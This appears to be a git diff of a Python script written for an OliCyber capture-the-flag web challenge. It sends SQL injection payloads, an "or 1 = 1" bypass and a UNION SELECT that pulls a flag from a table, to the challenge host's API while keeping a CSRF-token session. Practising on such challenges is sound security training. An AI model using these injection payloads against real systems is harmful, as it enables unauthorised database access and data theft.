@@ -1,13 +1,14 @@
-import requests
+import requests as rr
 import binascii
 import time
 
+url = " http://web-17.challs.olicyber.it/union"
 
 class Inj:
     def __init__(self, host):
-        self.sess = requests.Session()  # crea un istanza di oggetto session per mantenersi nella stessa sessione
+        self.sess = rr.Session()  # crea un istanza di oggetto session per mantenersi nella stessa sessione
         self.base_url = '{}/api/'.format(host)
-        self._refresh_csrf_token()  # Refresh the ANTI-CSRF token
+        self._refresh_csrf_token()  # aggiorna il token cross site request forgery
 
     def _refresh_csrf_token(self):
         resp = self.sess.get(self.base_url + 'get_token')  # fa un get tramite l'oggetto sessione e salva i token
@@ -39,7 +40,6 @@ class Inj:
         response = self._do_raw_req(url, query)
         return response['result'], response['sql_error']
 
-
-inj = Inj("http://web-17.challs.olicyber.it")
-response, error = inj.logic("'or 1 = 1 or '")
-print(response)
+inj = Inj(url)
+r, error = inj.logic("1' UNION SELECT flag, 2,3,4,5,6 from real_data where '1 = 1")
+print(r)
